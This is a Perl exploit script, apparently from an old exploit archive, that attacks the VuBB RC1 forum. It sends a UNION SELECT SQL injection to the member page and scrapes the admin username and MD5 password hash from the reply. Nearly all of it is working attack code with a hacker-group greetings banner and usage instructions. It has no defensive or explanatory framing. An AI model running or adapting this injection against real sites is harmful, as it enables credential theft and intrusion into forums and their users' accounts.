#!/bin/env perl
#------------------------------------------------------------#
#-	VuBB RC1 SQL Injection .. By Devil-00 < devil-00@s4a.cc >
#-	[!]	==|| This Exploit Only When magic_quotes_gpc Is OFF ||==
#-		Gr33tz :-                                                              
#-			Abducter ..															 
#-			Devil-00 .. SQL Injection F0und3r & Expl0ting - | devil-00@s4a.cc | -  
#-			Security4Arab .. A'Where Home .. WE LOVE S4A FOR EVER :P               
#-			Xion ..																  
#-			HACKERS PAL ..														  
#-			Yes2Hack ..                                                            
#-			WwW.Sqor.NeT                                                           
#-			WwW.S4a.Cc                                                             
#-			WwW.SecurityGurus.NeT 
#------------------------------------------------------------#
use LWP::Simple;

print "\n\n==========================================\n";
print "\n= Exploit for VuBB RC1						          ";
print "\n= Coded By Devil-00 | devil-00@s4a.cc |				  ";
print "\n= Gr33tz :-                                                              ";
print "\n= Abducter ..								  ";
print "\n= Devil-00 .. SQL Injection F0und3r & Expl0ting - | devil-00@s4a.cc | -  ";
print "\n= Security4Arab .. A'Where Home .. WE LOVE S4A FOR EVER :P               ";
print "\n= Xion ..								  ";
print "\n= HACKERS PAL ..							  ";
print "\n= Yes2Hack ..                                                            ";
print "\n= WwW.Sqor.NeT                                                           ";
print "\n= WwW.S4a.Cc                                                             ";
print "\n= WwW.SecurityGurus.NeT                                                  ";
print "\n============================================\n\n";

if(!$ARGV[0] or !$ARGV[1]) {
  print "\n==|| This Exploit Only When magic_quotes_gpc Is OFF ||==";	
  print "\nUsage:\nperl $0 [Full-Path] [User ID]\n\nExample:\nperl $0 http://vubb.com/forum/ 1\n";
  exit(0);
}
$url = "/index.php?act=member&m=-99%20UNION%20SELECT%20null,null,null,null,null,null,null,null,null,null,null,null,null,user,null,null,pass,null%20FROM%20members%20WHERE%20id=1/*";
$page = get($ARGV[0].$url) || die "[-] Unable to retrieve: $!";
print "[+] Connected to: $ARGV[0]\n";
$page =~ m/Website: <a href='(.*?)'>(.*?)<\/a>/ && print "[+] User ID is: $1\n";
print "[-] Unable to retrieve User ID\n" if(!$1);
$page =~ m/Yahoo: (.*?)<br \/>/ && print "[+] MD5 hash of password is: $1\n";
print "[-] Unable to retrieve hash of password\n" if(!$1);


# milw0rm.com [2005-11-02]
